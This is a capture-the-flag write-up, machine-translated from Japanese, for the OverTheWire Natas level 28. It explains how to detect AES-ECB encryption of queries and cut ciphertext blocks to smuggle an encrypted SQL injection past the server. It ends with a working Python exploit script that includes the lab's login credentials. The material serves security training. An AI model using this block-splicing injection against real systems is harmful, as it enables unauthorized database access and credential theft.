リクエストを送信すると、奇妙なリクエストとbase64エンコーディングを含む別のページへのリダイレクトが表示されますが、そのデコードでは何も起こりません。



クエリのリクエストを送信します。エラーが発生し、リダイレクトが暗号化を使用していることが明らかになり、このページでは、リクエストがデータベースに転送される前に復号化されます。つまり、インジェクションを暗号化してサーバーに送信する必要がありますが、キーがわかりません。しかし、暗号化装置があります-これがサーバーです。



まず、暗号化について考えましょう。2つの異なる行「qwerty」と「asdfgh」を送信し、それらがどのように変換されるかを分析します。



それに応じて、特定の場所に特徴的なシーケンスを持つ同一の行を取得します。2つのPC（暗号テキスト）の最初と最後が同じであるため、次の結論を導き出すことができます。

  • OTの最初の補完が使用されます（プレーンテキスト）。
  • OTへの最後の追加があります。
  • 異なるOTでCTの最後のブロックが同じである、つまり、ブロックが互いに独立しているため、ECBモードが使用されます。

アイデアはこれです：暗号化のためにデータベースにクエリを送信しますが、変換されるため、復号化するときにインジェクションは通過しません。ペイロードが暗号化されるブロックを正確に計算するために、アドオンを処理する必要があります。次に、暗号化後、リクエストからブロックを取り、それらのみをサーバーに送信します。サーバー上では、それらは復号化され、アドオンがないため、実行されます。

アイデアは4つの画像で提示されます。

  1. 5ブロックのプレゼンテーション。
  2. 空の文字列を暗号化する開始と終了の追加機能を持つエンコーダー。
  3. 文字列「TEXTTEXTTEXTTEXT」の暗号化。
  4. 行の前後に必要な数の文字を追加して別のブロックに配置することで、追加を取り除きます。PCから2番目のブロックのみを取得します。



このようにして、未知のキーで暗号化された文字列のみを受け取りました!!!

必要なデータ：

  1. 暗号化モード（既知-ECB）
  2. ブロック長（既知-16）
  3. 初期完了長（不明）
  4. テキストの長さ（ "SELECT password
    AS joke FROM users" として知られています）

初期充填の長さを調べる必要があります。最初の2つのブロックは同じなので、送信する文字数は異なり、3番目のブロックの変更が停止するとすぐに、それを補完するために必要な文字数がわかります。これらは10文字です。以下は、上記のアルゴリズムの実装です。

import base64
import requests
from urlparse import urlsplit
from urllib2 import unquote

def ChiperQuery(url, auth, query):
    resp = requests.post(url, auth=auth, data={'query': query})
    query_param = unquote(urlsplit(resp.url)[3][6:])
    byte_decode_query = bytearray(base64.b64decode(query_param))
    return byte_decode_query

def SendPayload(url, auth, payload):
	enc_payload = base64.b64encode(bytes(payload))
	ret = requests.get(url + '/search.php', auth=auth, params={'query': enc_payload})
	return ret.text

url = "http://natas28.natas.labs.overthewire.org/"
auth = requests.auth.HTTPBasicAuth("natas28", "JWwR438wkgTsNKBbcJoowyysdM82YjeF")

query = "SELECT password AS joke FROM users"
query += " " * (16-len(query)%16)
plaintext = 'b'*10 + query + chr(16)*16

chip_query = ChiperQuery(url, auth, plaintext)
st_pos = len(query)
count = st_pos+16
result = SendPayload(url, auth, chip_query[st_pos:st_pos+count])
print(result)
